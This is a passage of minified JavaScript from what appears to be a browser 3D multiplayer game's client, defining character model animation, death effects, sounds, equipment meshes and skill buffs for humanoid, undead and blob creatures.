                this.cDist = 1 / 0,
                this.inFog = !0,
                this.animQueue = [],
                this.currentAnim = void 0,
                this.walking = !0,
                this.falling = !1,
                this.tickTimer = new fh(0, 1),
                this.needsColorUpdate = !1,
                this.colors = new Set,
                this.hasDied = !1,
                this.effects = []
        }
        cycle(t) {
            return 0 == t ? this.cycleSin : Math.sin(this.cycleRad + 2 * t * Math.PI)
        }
        checkCycleReset(t) {
            t != this.lastFlags && (this.cycleOne = 0),
                this.lastFlags = t
        }
        addPushBack(t, e) {
            this.cDist < 50 && (this.pushBackVel[0] -= t[0] * e / this.entity.size,
                this.pushBackVel[1] -= t[2] * e / this.entity.size)
        }
        tickPushBack(t, e, s) {
            this.cDist < 50 && ($a(this.pushBackVel, this.pushBackVel, this.pushBack, 1500 * -t / this.entity.size),
                ka(this.pushBackVel, this.pushBackVel, .7),
                $a(this.pushBack, this.pushBack, this.pushBackVel, t),
                Ta(this.pushBackOffset, this.pushBack, -this.entity.rot))
        }
        updateVisibility() {
            const t = void 0 !== this.entity.mount ? 1 / 0 : Math.min(120, .7 * Ba.FS);
            return this.cDist = nn(this.position, Ba.worldPosition),
                this.inFog = this.cDist > t,
                !this.inFog && Ba.frustumIntersectsSphere(this.entity.visualPosition, this.scale[1]) ? (this.meshes.forEach(e => {
                    e.visible = void 0 !== e.geometry && (!e.parent || e.parent.visible) && (!e.geometry.bounds.initiated || this.cDist / (e.geometry.bounds.radius * e.data.lod * this.entity.size) < t)
                }
                ),
                    this.visible = !0,
                    !0) : (this.visible && (this.visible = !1,
                        this.meshes.forEach(t => t.visible = !1)),
                        !1)
        }
        tick(t, e, s) {
            this.updateVisibility() && (this.needsColorUpdate && this.colorUpdate(),
                void 0 === this.entity.stats || this.entity.stats.alive ? (this.cycleOne = (this.cycleOne + this.speed * t) % 1,
                    this.cycleRad = this.cycleOne * Math.PI * 2,
                    this.cycleSin = Math.sin(this.cycleRad),
                    this.tickAnimations(t),
                    void 0 !== this.sounds.idle && this.idleSoundTimer.done(e) && Math.random() < .08 && (this.playSound(this.sounds.idle),
                        this.idleSoundTimer.reset(s.time)),
                    this.falling = this.falling && !this.entity.onGround || !this.falling && !this.onGround && Math.abs(this.entity.vel[1]) > 6,
                    this.walking = 0 != this.entity.steer[0] || 0 != this.entity.steer[1],
                    this.tickParts(t, e, s)) : this.tickDeath(t, e, s),
                this.tickOverrides(t, e, s),
                this.updateMatrixWorld(!0))
        }
        tickAnimations(t) {
            if (this.currentAnim = this.animQueue[0],
                this.currentAnim) {
                const e = this.currentAnim.time;
                this.currentAnim.time += this.animQueue.length * t,
                    this.currentAnim.sounds && this.currentAnim.sounds.forEach(t => {
                        e < t.delay && this.currentAnim.time > t.delay && dl({
                            loop: !1,
                            transform: this,
                            ...t
                        })
                    }
                    ),
                    this.currentAnim.fract = this.currentAnim.time / this.currentAnim.duration,
                    this.currentAnim.time > this.currentAnim.duration && (this.currentAnim.fract = 1,
                        this.currentAnim.loop || this.currentAnim.stop || this.animQueue.shift(),
                        this.currentAnim.loop && (this.currentAnim.time -= this.currentAnim.duration)),
                    this.currentAnim.anticipate = lr.anticipate(this.currentAnim.fract)
            }
        }
        fraction(t, e, s = this.cycleOne) {
            return s >= t && s - this.speed * e < t
        }
        mesh(t, e, s, i, n) {
            const a = Kh({
                geo: e || "engine/cube.ho",
                program: n || jc.multimeshFlat,
                ts: !0,
                rs: !1,
                dynamic: !0,
                frustum: !1,
                ...i
            });
            return a.data.lod = 1,
                a.visible = !1,
                void 0 !== s && this.changeMeshBaseColor(a, s),
                null !== t && a.setParent(t || this),
                this.meshes.push(a),
                a
        }
        removeMesh(t, e) {
            t.setParent(null),
                t.data.multi.remove(t),
                e && this.meshes.splice(this.meshes.indexOf(t), 1)
        }
        onRemove() {
            this.meshes.forEach(t => {
                this.removeMesh(t, !1)
            }
            ),
                this.meshes.length = 0,
                this.effects.forEach(t => {
                    t.data.remove = !0
                }
                ),
                this.setParent(null)
        }
        anim(t) {
            this.visible && (this.animQueue.push({
                id: t.id,
                duration: t.dur,
                time: 0,
                fract: 0,
                sounds: t.sounds,
                stop: t.stop || !1,
                loop: t.loop || !1
            }),
                this.animQueue.length > 5 && this.animQueue.shift())
        }
        clearAnims() {
            this.animQueue.length = 0
        }
        playSound(t, e = 5) {
            this.inFog || dl({
                loop: !1,
                transform: this,
                delay: .2,
                distance: e + this.scale[1],
                force: this.scale[1] > 2,
                pitch: this.getScaleFactor(),
                ...t
            })
        }
        onHurt(t) {
            this.sounds.hurt && (t > .2 || this.hurtSoundTimer.done(Ua.time)) && (this.playSound(this.sounds.hurt),
                this.hurtSoundTimer.reset(Ua.time))
        }
        onEffort() {
            this.sounds.effort && Yo(0, 1) < .3 && this.playSound(this.sounds.effort)
        }
        onAggro() {
            this.sounds.aggro && (this.playSound(this.sounds.aggro),
                this.idleSoundTimer.reset(Ua.time))
        }
        onDeath() {
            this.hasDied = !0,
                this.sounds.death && this.playSound(this.sounds.death, 8),
                this.eyes && (this.removeMesh(this.eyes, !0),
                    this.eyes = void 0),
                this.addColor(kf.death),
                this.deathTimer.reset(Ua.time);
            let t = this.meshes.length;
            for (; t--;) {
                const e = this.meshes[t];
                e.data.deathSize = (e.geometry.bounds.initiated ? e.geometry.bounds.radius : 1) * (e.scale[0] + e.scale[1] + e.scale[2]) / 3,
                    !e.visible || e.parent && !e.parent.visible || e.data.deathSize < .5 ? (this.removeMesh(e, !1),
                        this.meshes.splice(t, 1)) : (e.setParent(null),
                            In(e.position, e.KP),
                            Dn(e.scale, e.KP),
                            Bn(e.quaternion, e.KP),
                            e.rotationNeedsUpdate = !0,
                            e.data.deathVel = [Yo(-.5, .5), 1, Yo(-.5, .5)])
            }
        }
        tickDeath(t, e, s) {
            this.meshes.forEach(i => {
                if (!i.visible || void 0 === i.data.deathVel)
                    return;
                if (this.deathTimer.done(e))
                    return void this.removeMesh(i, !0);
                const n = i.data.deathVel
                    , a = i.data.deathSize;
                sn(i.position, i.position, n, t),
                    en(n, n, 1 - 3 * t);
                const r = s.getHeight(i.position[0], i.position[2]) + .5 * a;
                n[1] < 0 && i.position[1] < r ? n[1] < -1 ? (n[1] = .7 * Math.abs(n[1]),
                    n[0] += Yo(-1, 1) / a,
                    n[2] += Yo(-1, 1) / a) : n[1] = -.5 : n[1] -= 50 * t,
                    cn(Oa, n, La),
                    sn(i.rotation, i.rotation, Oa, 5 * -t),
                    i.rotationNeedsUpdate = !0,
                    i.updateMatrixWorld(!0)
            }
            )
        }
        getScaleFactor() {
            return 1 / (.7 + .3 * this.scale[1])
        }
        getTopAbsolute() {
            return this.entity.height * this.entity.size * .5
        }
        tickFixed(t, e, s) { }
        tickOverrides(t, e, s) { }
        setCrown() { }
        setHeadgear() { }
        setCape() { }
        setGem() { }
        addColor(t) {
            this.colors.add(t),
                this.needsColorUpdate = !0
        }
        removeColor(t) {
            this.colors.delete(t),
                this.needsColorUpdate = !0
        }
        colorUpdate() {
            this.needsColorUpdate = !1,
                this.meshes.forEach(t => this.updateMeshColor(t))
        }
        changeMeshBaseColor(t, e) {
            t.data.basecolor = e,
                void 0 !== !t.data.color && (t.data.color = [0, 0, 0, 0]),
                this.updateMeshColor(t)
        }
        updateMeshColor(t) {
            const e = t.data.color;
            qn(e, t.data.basecolor),
                this.colors.forEach(t => {
                    const s = t[3]
                        , i = 1 - s;
                    e[0] = e[0] * i + t[0] * s,
                        e[1] = e[1] * i + t[1] * s,
                        e[2] = e[2] * i + t[2] * s
                }
                )
        }
    }
    const jf = {
        melee: {
            delay: .3,
            distance: 5,
            rnd: 3,
            id: "melee/sword"
        },
        hurt: {
            id: "humanoid/hurt",
            rnd: 7
        },
        death: {
            id: "humanoid/death",
            rnd: 2
        },
        effort: {
            id: "humanoid/effort",
            rnd: 7
        }
    };
    class qf extends Of {
        constructor(t) {
            t.sounds || (t.sounds = jf),
                super(t),
                this.chest = this.mesh(this, null, t.QY, null, t.shader),
                this.chest.data.lod = 3,
                this.hands = [],
                this.legs = [];
            for (let e = 0; e < 2; ++e) {
                const e = this.mesh(this.chest, "character/hand.ho", this.chest.data.color, null, t.shader);
                e.data.lod = 2;
                const s = this.mesh(this, "character/boot.ho", kf.greysteel, null, t.shader);
                Vi(s.scale, .4, .4, .4),
                    s.data.lod = .6,
                    this.legs.push(s),
                    this.hands.push(e)
            }
            this.eyes = this.mesh(this.chest, "character/eyes.ho", t.colEyes || kf.black, null, jc.multimeshSimple),
                this.eyes.data.lod = 1.5,
                this.eyesBlink = 0,
                Vi(this.eyes.position, 0, -.05, .52),
                this.hasJustJumped = !1,
                this.hasJustLanded = !0,
                this.flip = 0,
                this.capeswing = !0,
                this.cape = void 0,
                this.headgear = void 0,
                this.gem = void 0,
                this.shouldergem = void 0,
                this.movementPushback = [0, 0, 0],
                this.movementPushbackVel = [0, 0, 0]
        }
        tickFixed(t, e, s) {
            super.tickFixed(t, e, s),
                this.tickPushBack(t, e, s)
        }
        tickPushBack(t, e, s) {
            super.tickPushBack(t, e, s),
                this.chest.visible && this.cDist < 25 && 0 === this.entity.type && (sn(this.movementPushback, this.movementPushback, this.movementPushbackVel, 60 * t),
                    sn(this.movementPushbackVel, this.movementPushbackVel, this.movementPushbackVel, -20 * t),
                    sn(this.movementPushbackVel, this.movementPushbackVel, this.movementPushback, -10 * t),
                    this.movementPushbackVel[2] += .01 * this.entity.steer[1],
                    this.movementPushbackVel[0] -= .01 * this.entity.steer[0])
        }
        tickParts(t, e, s) {
            this.walking = void 0 === this.entity.mount && this.walking,
                this.checkCycleReset(this.falling << 1 | (!this.falling && this.walking) << 2),
                this.calculateCycleSpeed(),
                this.updateChest(),
                this.updateHands(),
                this.updateLegs(),
                this.updateEyes(t),
                this.tickWalkSounds(t),
                this.tickLanding(),
                this.tickEquipment(t, e, s)
        }
        tickOverrides(t, e, s) {
            this.chest.visible && this.entity.buffs.incapacitated.size > 0 && Array.from(this.entity.buffs.incapacitated).some(t => t.logic.visualIncapacitation) && (Ji(this.chest.rotation, .3 * (Math.sin(2.2 * e) + .3 * Math.sin(2.1 * e)) + 1, .3 * (Math.sin(2.1 * e) + .6 * Math.sin(2 * e)), .3 * (Math.sin(.8 * e) + .5 * Math.sin(2.3 * e))),
                this.chest.rotationNeedsUpdate = !0,
                this.hands.forEach(t => t.position[1] -= .2))
        }
        tickEquipment(t, e, s) {
            const i = this.hands[0];
            if (i.visible && (void 0 !== this.weapon && (this.sheathed || (this.entity.mount ? this.sheathe(!0) : !this.entity.target || this.walking || this.falling ? (i.rotation[0] += .5,
                i.position[1] -= .2,
                i.position[0] -= .1) : (i.rotation[0] += 1,
                    i.rotation[2] += .6,
                    i.position[2] -= .3,
                    i.position[1] -= .2,
                    i.position[0] -= .1,
                    this.legs[0].position[0] -= .05,
                    this.legs[1].position[0] += .05,
                    this.legs[0].position[2] -= .2,
                    this.chest.position[1] += .05 * Math.sin(3 * e) - .05,
                    this.chest.rotation[1] -= .05 * Math.cos(3 * e)))),
                this.currentAnim)) {
                const t = lr.easeInOutCubic(this.currentAnim.fract)
                    , e = -Math.sin(7.5 * t - 1.5)
                    , s = -Math.sin(6.28 * t)
                    , n = -Math.sin(3.14 * t)
                    , a = lr.easeOutExpo(-n);
                switch (en(i.rotation, i.rotation, 1 - a),
                this.currentAnim.id) {
                    case 0:
                        if (void 0 !== this.weapon)
                            this.sheathe(!1),
                                Ji(i.rotation, 1.7 * n, 1.5 * a, e * a + .5 * a),
                                i.position[2] -= n - t * a,
                                i.position[1] += Math.sin(13 * t + 3) * a * .5,
                                i.position[0] += (1.5 * t - .5) * a,
                                this.chest.rotation[1] += 1.5 * s;
                        else {
                            const e = Math.cos(6.28 * t);
                            this.chest.position[2] += (.3 + .2 * Math.sin(6.28 * t - 3.14)) * a,
                                this.chest.rotation[0] += .5 * Math.sin(3.28 * t) * a,
                                this.hands.forEach((s, i) => {
                                    s.visible && (en(s.position, s.position, 1 - a),
                                        s.position[2] += (1 - .5 * e) * a,
                                        s.position[1] += Math.sin(6.28 * t) * (t > .5 ? .7 : 1),
                                        s.position[0] += (i ? .5 + .2 * n : -.5 - .2 * n) * a,
                                        Vi(s.rotation, 0, 1.5, 0))
                                }
                                )
                        }
                        break;
                    case 1:
                        this.sheathe(!1),
                            i.rotation[0] -= 1.7 * n,
                            i.rotation[1] += 1.5 * a - a,
                            i.rotation[2] += e * a + .5 * a,
                            i.position[2] += a,
                            i.position[0] -= .5 * a,
                            this.chest.rotation[1] -= 1.5 * s - .5 * a;
                        break;
                    case 4:
                        this.sheathe(!1),
                            i.rotation[0] += 1.7 * n,
                            i.rotation[1] -= 1.5 * n,
                            i.position[0] -= .5 * a,
                            this.chest.rotation[1] = 2 * t * Math.PI + 3 * a;
                        break;
                    case 3:
                        this.sheathe(!0),
                            Vi(this.chest.rotation, n, 0, 0),
                            Vi(i.position, -.3, 0, .7);
                        break;
                    case 9:
                        this.sheathe(!1),
                            Vi(i.rotation, 0, 0, 0)
                }
            }
            this.tickShield(),
                this.tickCape(t)
        }
        tickShield() {
            const t = this.hands[1];
            void 0 !== this.shield && t.visible && (!this.entity.target || this.walking || this.falling ? (t.rotation[2] -= .1,
                t.position[1] += .1) : (t.rotation[2] -= .2,
                    t.rotation[1] -= 1,
                    t.position[1] += .1,
                    t.position[2] += .4))
        }
        tickCape(t) {
            void 0 !== this.cape && this.cape.visible && this.capeswing && ((this.entity.steer[1] > 0 || this.falling) && (this.capeoffset += .5 * Wi(this.entity.vel) * t),
                this.capeoffset *= 1 - 3 * t,
                Vi(this.cape.rotation, Math.max(0, this.capeoffset), 0, 0),
                this.cape.rotationNeedsUpdate = !0)
        }
        tickWalkSounds(t) {
            (this.cDist < 20 || this.scale[1] > 2) && !this.falling && this.walking && (this.fraction(.2, t) || this.fraction(.7, t)) && dl({
                id: this.scale[1] > 2 || this.chest.scale[1] > 2 ? "step_giant" : "step_grass",
                rnd: 3,
                loop: !1,
                transform: this,
                distance: Math.min(1 + 3 * this.scale[1], 10),
                force: this.scale[1] > 2
            })
        }
        tickLanding() {
            this.hasJustJumped && this.entity.onGround && (this.cDist < 20 && (0 == this.entity.vel[1] || this.entity.vel[1] < -4) && (dl({
                id: "land_grass",
                loop: !1,
                transform: this,
                distance: 3
            }),
                this.movementPushbackVel[2] = .05,
                this.movementPushbackVel[1] = -.15,
                this.eyesBlink = .3),
                this.hasJustLanded = !0,
                this.hasJustJumped = !1,
                this.flip = 0,
                this.rotationNeedsUpdate = !0),
                this.hasJustLanded && !this.entity.onGround && (this.entity.vel[1] > 5 && (dl({
                    id: "jump_grass",
                    loop: !1,
                    transform: this,
                    distance: 3
                }),
                    Math.random() < .5 && (this.flip = this.entity.steer[1]),
                    this.movementPushbackVel[2] = .05,
                    this.movementPushbackVel[1] = -.1,
                    this.eyesBlink = .3,
                    Yo(0, 1) < .2 && this.onEffort()),
                    this.hasJustJumped = !0,
                    this.hasJustLanded = !1)
        }
        updateEyes(t) {
            this.eyes.visible && (this.eyesBlink > 0 ? this.eyesBlink -= t : Math.random() < .006 && (this.eyesBlink = .1),
                Vi(this.eyes.scale, 1, this.eyesBlink > 0 ? .1 : 1, .1))
        }
        updateLegs() {
            this.legs.forEach((t, e) => {
                if (t.visible)
                    if (this.entity.mount)
                        this.entity.mount.mountLegs(t, e);
                    else {
                        if (this.currentAnim && 10 === this.currentAnim.id)
                            return void (t.visible = !1);
                        const s = mr(this.entity.steer);
                        if (this.falling)
                            if (0 == this.flip) {
                                const i = .1 * Math.max(-1, Math.min(0, .2 * this.entity.vel[1]))
                                    , n = e ? .3 * this.cycle(0) - i : .3 * this.cycle(.5) + i;
                                Vi(Oa, e ? .3 - i : -.3 + i, -.65, n),
                                    mn(t.position, Oa, 0),
                                    Vi(t.rotation, -n, s, 0),
                                    t.rotationNeedsUpdate = !0
                            } else
                                Vi(t.position, e ? .3 : -.3, -.3, 0),
                                    Vi(t.rotation, 0, 0, 0),
                                    t.rotationNeedsUpdate = !0;
                        else {
                            if (this.walking) {
                                const i = this.entity.steer[1] < 0 ? .4 : .6
                                    , n = this.cycle(0) * i * 1.3;
                                Vi(Oa, e ? .3 : -.3, Math.max(0, .6 * Math.cos(this.cycleRad + (e ? 0 : Math.PI))) - .55, this.cycle(e ? 0 : .5) * i),
                                    mn(t.position, Oa, s),
                                    Vi(t.rotation, e ? -n : n, s, 0),
                                    t.rotationNeedsUpdate = !0
                            } else
                                Vi(t.rotation, 0, e ? .1 : -.1, 0),
                                    t.rotationNeedsUpdate = !0,
                                    Vi(t.position, e ? .45 : -.45, -.65, 0);
                            this.currentAnim && !this.walking && (5 != this.currentAnim.id && 6 != this.currentAnim.id && 9 != this.currentAnim.id || Vi(t.position, e ? .4 : -.55, -.65, e ? .2 : -.3))
                        }
                    }
            }
            )
        }
        updateChest() {
            if (this.chest.visible) {
                this.chest.rotationNeedsUpdate = !0,
                    this.falling && void 0 === this.entity.mount ? (this.rotation[0] = this.cycleRad * this.flip,
                        this.rotationNeedsUpdate = this.rotationNeedsUpdate || 0 != this.flip,
                        Vi(this.chest.position, 0, 0 != this.flip ? .3 : .5, 0)) : (this.walking ? Vi(this.chest.position, 0, .1 * Math.cos(2 * this.cycleRad) + .4, 0) : Vi(this.chest.position, 0, void 0 === this.entity.mount ? .1 * this.cycle(0) + .4 : .4, 0),
                            0 !== this.rotation[0] && (this.rotation[0] = 0,
                                this.rotationNeedsUpdate = !0)),
                    Vi(this.chest.rotation, 5 * -this.pushBack[1] + this.movementPushback[2], 0, 5 * this.pushBack[0] - this.movementPushback[0]),
                    br(this.chest.position, this.chest.position, this.pushBackOffset),
                    sn(this.chest.position, this.chest.position, this.movementPushback, 1);
                const t = .5 * -this.movementPushback[1];
                if (Vi(this.chest.scale, 1 + t, 1 - t, 1 + t),
                    void 0 !== this.currentAnim)
                    if (5 != this.currentAnim.id && 6 != this.currentAnim.id || (this.chest.rotation[1] -= .3 + .05 * this.cycle(.2),
                        this.chest.rotation[0] += .3 + .02 * this.cycle(.4),
                        this.chest.position[1] -= .1 + .05 * this.cycle(.6),
                        this.chest.position[0] -= .05),
                        6 == this.currentAnim.id)
                        this.chest.rotation[1] *= 1 - this.currentAnim.anticipate;
                    else if (10 == this.currentAnim.id)
                        Vi(this.chest.position, 0, .2 + .5 * Math.sin(this.currentAnim.fract * Math.PI), 0),
                            this.chest.rotation[0] += this.currentAnim.fract * hr,
                            this.chest.rotation[1] += mr(this.entity.steer);
                    else if (9 == this.currentAnim.id) {
                        const t = lr.easeOutQuad(nr(2 * this.currentAnim.fract, 0, 1));
                        this.chest.position[1] += .2 * Math.sin(3 + 5 * t),
                            this.chest.rotation[0] += .5 - .5 * t
                    }
            }
        }
        updateHands() {
            this.hands.forEach((t, e) => {
                if (t.visible) {
                    if (t.rotationNeedsUpdate = !0,
                        this.falling && void 0 === this.entity.mount)
                        Vi(t.position, e ? .6 : -.6, -nr(this.entity.vel[1], -5, 5) / 20, 0),
                            t.position[0] += (e ? 1 : -1) * Math.sin(3.1 * t.position[1] + .8) * .3,
                            Vi(t.rotation, 0, e ? Math.PI : 0, -.3 - t.position[1]);
                    else if (this.walking) {
                        const s = this.cycle(0)
                            , i = this.entity.steer[1] < 0 ? .3 : .5
                            , n = Math.sin(2 * this.cycleRad + 5);
                        Vi(t.rotation, 0, s * i * 1.3 + (e ? Math.PI : 0), 0),
                            Vi(t.position, (e ? .7 : -.7) + n * (e ? -.2 : .2), s * (e ? .3 : -.3) - .2, .2 + s * i * (e ? -1.5 : 1.5)),
                            t.position[0] = e ? Math.max(.5, t.position[0]) : Math.min(-.5, t.position[0])
                    } else if (this.entity.mount)
                        Vi(t.rotation, 0, e ? -1.3 + Math.PI : 1.3, .3),
                            Vi(t.position, e ? .3 : -.3, -.5, .7);
                    else {
                        const s = this.cycle(0);
                        Vi(t.rotation, 0, (e ? -.43 + Math.PI : .43) + .15 * s * (e ? 1 : -1), .3),
                            Vi(t.position, e ? .7 : -.7, .08 * s - .3, .15 - .1 * s)
                    }
                    if (this.currentAnim)
                        if (5 == this.currentAnim.id || 6 == this.currentAnim.id)
                            0 == e ? (t.position[0] -= .2,
                                t.position[1] -= .2,
                                6 == this.currentAnim.id && (en(t.position, t.position, 1 - this.currentAnim.fract),
                                    t.position[0] += .3 * -this.currentAnim.fract,
                                    t.position[2] += .6 * this.currentAnim.anticipate)) : (t.position[0] -= .4,
                                        t.position[2] += .5 - .2 * this.cycle(.3),
                                        t.rotation[1] += .6 + .2 * this.cycle(.4),
                                        t.rotation[0] -= .8,
                                        6 == this.currentAnim.id && (en(t.position, t.position, 1 - this.currentAnim.fract),
                                            t.position[0] += .3 * this.currentAnim.fract,
                                            t.position[2] += this.currentAnim.fract));
                        else if (9 === this.currentAnim.id) {
                            const s = lr.easeInOutCubic(nr(2 * this.currentAnim.fract, 0, 1));
                            Vi(t.rotation, 1 - s, 0, 0);
                            const i = Math.sin(3 * s);
                            0 == e ? Vi(t.position, -.12 - .35 * i, 1.2 * s - .1, .3 + i) : Vi(t.position, .12 + .35 * i, 1.2 * s, .3 + i)
                        }
                    if (this.shoulders) {
                        const s = this.shoulders[e];
                        s.visible && (s.lookAt(t.position, !1, La),
                            en(s.rotation, s.rotation, .5),
                            s.rotation[1] -= e ? .8 : -.8,
                            s.rotation[2] -= e ? .5 : -.5,
                            s.rotationNeedsUpdate = !0)
                    }
                }
            }
            )
        }
        calculateCycleSpeed() {
            this.falling ? this.speed = 1.5 : this.walking ? this.speed = this.entity.speed * (-1 === this.entity.steer[1] ? 1.3 : 1) * .45 / (.4 + .6 * this.entity.size) : this.speed = .5
        }
        sheathe(t) {
            this.sheathed !== t && (this.sheathed = t,
                void 0 !== this.weapon && (this.weapon.setParent(t ? this.chest : this.hands[0]),
                    this.sheathed ? Yi(this.weapon.position, this.sheathedWeaponPos) : Yi(this.weapon.position, this.unsheathedWeaponPos)),
                this.shield && (this.shield.setParent(t ? this.chest : this.hands[1]),
                    this.sheathed ? (Vi(this.shield.position, 0, -.2, -.65),
                        Vi(this.shield.rotation, 0, -1.57, 0)) : (Vi(this.shield.position, -.2, 0, 0),
                            Vi(this.shield.rotation, 0, 0, 0))))
        }
        setShoulders(t, e = 1, s = !1) {
            this.hasDied || !1 === t ? this.hasDied || void 0 === this.shoulders || (this.shoulders.forEach(t => this.removeMesh(t, !0)),
                this.shoulders = void 0,
                void 0 !== this.shouldergems && this.removeShouldergems()) : (this.shoulders || (this.shoulders = [this.mesh(this.chest), this.mesh(this.chest)]),
                    this.shoulders.forEach((s, i) => {
                        s.data.lod = .6,
                            Vi(s.position, i ? .5 : -.5, .4 * e - .4, -.05),
                            Vi(s.scale, .8 * e, .5 * e, .5 * e),
                            this.changeMeshBaseColor(s, t)
                    }
                    )),
                !1 !== s ? (this.shouldergems || (this.shouldergems = [this.mesh(this.shoulders[0], "character/spike.ho"), this.mesh(this.shoulders[1], "character/spike.ho")]),
                    this.shouldergems.forEach((t, e) => {
                        t.data.lod = .6,
                            Vi(t.rotation, 0, 3.14, 0),
                            Vi(t.position, e ? .2 : -.2, 0, -.5),
                            Vi(t.scale, .35, .55, .2),
                            this.changeMeshBaseColor(t, s)
                    }
                    )) : void 0 !== this.shouldergems && this.removeShouldergems()
        }
        removeShouldergems() {
            this.shouldergems.forEach(t => this.removeMesh(t, !0)),
                this.shouldergems = void 0
        }
        setCape(t, e) {
            this.hasDied || !1 === t ? this.hasDied || void 0 === this.cape || (this.removeMesh(this.cape, !0),
                this.cape = void 0) : (this.capeoffset = 0,
                    void 0 === this.cape && (this.cape = this.mesh(this.chest, "character/cape.ho"),
                        Vi(this.cape.position, 0, .2, -.55),
                        this.cape.data.lod = .6),
                    Vi(this.cape.scale, e, e, e),
                    this.changeMeshBaseColor(this.cape, t))
        }
        setHeadgear(t) {
            this.hasDied || !1 === t ? this.hasDied || void 0 === this.headgear || (this.removeMesh(this.headgear, !0),
                this.headgear = void 0) : (void 0 === this.headgear && (this.headgear = this.mesh(this.chest, "character/headgear.ho"),
                    this.headgear.data.lod = .5),
                    this.changeMeshBaseColor(this.headgear, t))
        }
        setGem(t, e = 1) {
            this.hasDied || !1 === t ? this.hasDied || void 0 === this.gem || (this.removeMesh(this.gem, !0),
                this.gem = void 0) : (void 0 === this.gem && (this.gem = this.mesh(this.chest, "character/spike.ho"),
                    Vi(this.gem.position, 0, .4, .54),
                    Vi(this.gem.scale, .3 * e, .3 * e, .08 * e),
                    this.gem.data.lod = .5),
                    this.changeMeshBaseColor(this.gem, t))
        }
        setCrown(t) {
            this.hasDied || !1 === t ? this.hasDied || void 0 === this.crown || (this.removeMesh(this.crown, !0),
                this.crown = void 0) : (void 0 === this.crown && (this.crown = this.mesh(this.chest, "character/crown.ho"),
                    this.crown.position[1] = .8),
                    this.changeMeshBaseColor(this.crown, t))
        }
    }
    const Xf = {
        death: {
            id: "undead/death",
            rnd: 2
        },
        hurt: {
            id: "undead/hurt",
            rnd: 3
        },
        melee: {
            delay: .2,
            distance: 4,
            id: "undead/attack",
            rnd: 3
        },
        aggro: {
            id: "undead/aggro",
            rnd: 2
        },
        idle: {
            id: "undead/idle",
            rnd: 6
        }
    };
    class Hf extends qf {
        constructor(t) {
            t.colPrim = t.colPrim || kf.emerald,
                t.colSec = t.colSec || kf.bone2,
                t.sounds = Xf,
                super({
                    QY: t.colPrim,
                    colEyes: kf.evilred,
                    ...t
                }),
                this.meat = this.mesh(this.chest, null, t.colSec),
                Vi(this.meat.position, .2, .2, -.2),
                Vi(this.meat.scale, .7, .7, .7),
                this.meat.data.lod = .7,
                this.setShoulders(t.colSec, .5),
                this.legs.forEach((e, s) => {
                    Vi(e.scale, .4, .4, .4),
                        this.changeMeshBaseColor(e, s ? t.colPrim : t.colSec)
                }
                ),
                this.hands.forEach((e, s) => this.changeMeshBaseColor(e, s ? t.colSec : t.colPrim))
        }
        tickEquipment(t, e, s) {
            void 0 !== this.currentAnim && 0 !== this.currentAnim.id || this.hands.forEach((t, e) => {
                Vi(t.position, e ? .5 : -.5, e ? .1 : -.1, 1),
                    Vi(t.rotation, 0, 1.5, 0),
                    t.rotationNeedsUpdate = !0
            }
            ),
                super.tickEquipment()
        }
        tickParts(t, e, s) {
            super.tickParts(t, e, s),
                Ji(this.chest.rotation, .1 * (Math.sin(1.8 * e) * Math.cos(2 * e) * .3 + .3 * Math.sin(1.4 * e)) + .2, .1 * (Math.sin(1.3 * e) + .6 * Math.sin(2.4 * e)), .1 * (Math.sin(.4 * e) + .5 * Math.sin(1.9 * e))),
                this.chest.rotationNeedsUpdate = !0,
                this.legs.forEach((t, s) => {
                    t.rotation[1] += .3 * Math.sin(.2 * e - s),
                        t.rotationNeedsUpdate = !0
                }
                )
        }
    }
    var Kf = new vf({
        id: 77,
        type: 1,
        tags: new Set([7]),
        incapacitated: !0,
        icon: "skills/37",
        fx: {
            visual: Hf,
            stick: _f.transformation,
            startSound: {
                id: "shaman/spiritAnimalCast",
                distance: 5,
                dynamic: !0
            },
            endSound: {
                id: "buffEnd",
                distance: 5,
                dynamic: !0
            }
        },
        statsStatic: (t, e) => {
            e.maxStat(26, 30 + 7 * t.level),
                e.maxStat(27, 20 + 3 * t.level)
        }
    })
        , Wf = new vf({
            id: 70,
            icon: "skills/28",
            fx: {
                stick: _f.caninehowl,
                stickOffset: .5,
                startSound: {
                    id: "shaman/caninehowlcast",
                    distance: 5
                }
            },
            diminish: !0,
            statsStatic: (t, e) => {
                e.addStat(16, Math.round((100 + 60 * t.level) * t.diminishFactor))
            }
        })
        , Yf = new vf({
            id: 53,
            type: 1,
            tags: new Set([3, 1]),
            icon: "skills/12",
            fx: {
                stick: _f.decay,
                stickOffset: .5,
                color: [.5, .4, .05, .5]
            },
            statsStatic: (t, e) => {
                e.maxStat(26, 20 + 3 * t.level)
            }
            ,
            intervalDuration: 1.5,
            onInterval: (t, e, s) => ({
                id: 12,
                mode: 1,
                caster: t.caster,
                target: e.id,
                dmg: 1 + s.stats.getDamageRoll() * (.1 + .08 * t.level),
                type: 1,
                noDaze: !0
            })
        })
        , Vf = new vf({
            id: 54,
            icon: "skills/13",
            fx: {
                stick: _f.manaBuff,
                startSound: {
                    id: "shaman/manaBuffCast",
                    distance: 5
                }
            },
            intervalDuration: .5,
            custom: [[t => 40 + 30 * t, "MP recovered"]],
            onInterval: (t, e, s) => { }
        })
        , Gf = new vf({
            id: 95,
            maxStacks: 5,
            icon: "skills/43",
            fx: {
                stick: _f.plagueSpreaderBuff
            }
        })
        , Qf = new vf({
            id: 94,
            passive: !0
        })
        , Jf = new vf({
            id: 46,
            maxStacks: 3,
            icon: "skills/7",
            fx: {
                stick: _f.revitalize
            },
            intervalDuration: 1,
            multiplyIncomingHeal: {
                6: t => 1 + .25 * t.stacks,
                7: t => 1 + .3 * (t.stacks - 1)
            },
            onInterval: (t, e, s) => ({
                id: 7,
                mode: 2,
                caster: t.caster,
                target: e.id,
                heal: 6 + s.stats.getDamageRoll() * (.035 + .03 * t.level)
            })
        })
        , tg = new vf({
            id: 50,
            passive: !0,
            icon: "skills/8",
            statsConvert: [[4, .4, 10], [4, .4, 11]]
        });
    const eg = {
        death: {
            id: "blob/death"
        },
        hurt: {
            id: "blob/hurt",
            rnd: 1
        },
        melee: {
            delay: .3,
            distance: 3,
            id: "blob/attack",
            rnd: 2
        },
        aggro: {
            id: "blob/aggro",
            rnd: 1
        },
        idle: {
            id: "blob/idle",
            rnd: 2
        }
    };
    class sg extends Of {
        constructor(t) {
            t.sounds = eg,
                super(t),
                this.chest = this.mesh(this, t.meshHead || null, t.colPrim || kf.slimegreen),
                this.blobs = [];
            for (let e = 0; e < 2; ++e) {
